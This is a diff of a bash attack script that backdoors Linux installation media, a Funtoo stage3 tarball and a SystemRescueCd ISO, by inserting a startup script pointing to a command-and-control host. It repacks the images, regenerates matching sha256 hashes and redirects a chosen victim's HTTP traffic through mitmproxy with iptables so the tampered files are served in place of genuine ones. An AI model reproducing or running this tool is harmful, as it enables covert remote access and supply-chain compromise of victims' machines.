@@ -9,8 +9,8 @@
 #set -x
 # Dependencies
 EXEC_PORTAGE="emerge -u pip dialog cdrtools squashfs-tools lighttpd"
-EXEC_APT="apt-get install dialog python-pip squashfs-tools genisoimage"
-EXEC_YUM="yum install dialog python-pip squashfs-tools mkisofs cdrtools"
+EXEC_APT="apt-get install dialog lighttpd python-pip squashfs-tools genisoimage"
+EXEC_YUM="yum install dialog lighttpd python-pip squashfs-tools mkisofs cdrtools"
 
 
 
@@ -61,14 +61,28 @@ function install_pypi {
 }
 
 function setup_funtoo (){
+RESCUE_BASE="systemrescuecd-x86-4.7.1"
+STAGE3_BASE="stage3-latest.tar.xz"
+
+if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_BASE".hash.txt" ];then
+  dialog --yesno "Existing installation media files found in the output directory. Continue funtoo setup?" 9 40
+   if [ $? -ge 1 ]; then
+      return
+   fi
+fi
 
 mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
-
+if [ -e $STAGE3_BASE ] && [ -e $RESCUE_BASE ]; then
+  dialog --yesno "Existing original installation media found, skip download?" 7 40
+     if [ $? -ge 1 ]; then
 # Get all the packages
-fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/stage3-latest.tar.xz #replace with current stage3 url
-fetch http://build.funtoo.org/distfiles/sysresccd/systemrescuecd-x86-4.7.1.iso
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE #replace with current stage3 url
+fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
+     fi
+ else
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE #replace with current stage3 url
+fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
 
-RESCUE_BASE="systemrescuecd-x86-4.7.1"
 
 # Mount the ISO
 mount -oloop ./${RESCUE_BASE}.iso ./backdoor-iso-ro
@@ -82,7 +96,7 @@ curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/mast
 
 # Update the scripts with the command and control
 sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '
-sed -i "s/REPLACEME/$CNC/" redirect.py
+sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # Make sure the IP contained is the IP your reverse shell handler is listening on
 cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '
@@ -92,7 +106,7 @@ chmod a+x ./backdoor-squash/etc/local.d/' '
 
 # Pack backdoored files
 cd backdoor-stage3
-tar -cJf ../out/stage3-latest.tar.xz *
+tar -cJf ../out/$STAGE3_BASE *
 cd ../backdoor-squash
 mksquashfs * ../sysrcd-backdoored.dat
 cd ../backdoor-iso-rw
@@ -111,8 +125,9 @@ fi
 $ISO_EXEC $ISO_ARGS
 
 cd ../out 
-sha256sum stage3-latest.tar.xz >  stage3-latest.tar.xz.hash.txt 
+sha256sum $STAGE3_BASE >  $STAGE3_BASE".hash.txt" 
 cd ..
+umount backdoor-iso-ro
 
 }
 
@@ -198,6 +213,27 @@ fi
 VICTIM_IP="$1"
 CNC="$2"
 
+# Pick victim IP, find what interface it is on, setup
+# iptables rules accordingly for the interface
+#
+# Example:
+# victim: 172.16.10.81
+# ip neigh show to 172.16.10.81
+# 172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE
+
+if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]; then
+    INTERFACE="eth0"
+else
+    INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
+fi
+
+INTERFACE_IP="$(ip -4 addr show $INTERFACE | grep -oP "(?<=inet).*(?=/)" )"
+
+if [ $? -ge 1 ]; then
+   INTERFACE_IP="0.0.0.0"
+fi
+
+
 install_packages
 
 install_pypi
@@ -256,7 +292,8 @@ dialog --checklist "What operating system distributions would you like to backdo
        6) 
        setup_fedora 
        ;;
-       7) setup_opensuse 
+       7) 
+       setup_opensuse 
        ;;
        8) 
        setup_arch 
@@ -301,20 +338,8 @@ if [ $? -ne 0 ]; then
 fi
 
 # Setup mitmproxy/mitmdump
-#
-# Pick victim IP, find what interface it is on, setup
-# iptables rules accordingly for the interface
-#
-# Example:
-# victim: 172.16.10.81
-# ip neigh show to 172.16.10.81
-# 172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE
+# configure iptables rules accordingly for the interface
 
-if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]; then
-    INTERFACE="eth0"
-else
-    INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
-fi
 
 # Set it up
 iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
